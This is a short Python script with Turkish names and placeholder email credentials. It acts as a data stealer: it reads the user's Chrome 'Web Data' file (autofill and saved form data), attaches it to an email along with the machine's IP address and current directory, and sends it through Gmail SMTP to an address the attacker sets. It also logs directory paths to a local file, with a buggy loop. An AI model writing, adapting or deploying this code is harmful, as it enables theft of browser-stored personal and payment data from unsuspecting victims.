import socket
import os
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import email.encoders
def mailgonder():
    msg = MIMEMultipart()
    msg['Subject'] = "yaz.jpg" + bilgiler2
    msg['From'] = "gmail adresiniz"
    msg['To'] = "mail gönderilecek mail adresi"
    part = MIMEBase('application', "octet-stream")
    
    part.set_payload(open(__import__("os").environ["USERPROFILE"]+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data", "rb").read())
    email.encoders.encode_base64(part)

    part.add_header('Content-Disposition', 'attachment; filename="dosyaadi.txt"')

    msg.attach(part)


    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login("sizin gmail adresniiz", "sizin gmail şifreniz")

    server.sendmail(msg['From'], msg['To'], msg.as_string())
with open("yaz.txt", "a") as f:
    for dosya_konum,gereksiz,dosya_liste in os.walk(os.getcwd()):
        if dosya_liste:
            for dosya in dosya_konum:
                veri = dosya_konum+"/"+dosya
                f.write(veri+"\n")

bilgiler1 = socket.gethostbyname(socket.gethostname())
dizin = os.getcwd()
bilgiler2 = "IP : "+str(bilgiler1)+" DIZIN : "+str(dizin)
mailgonder()
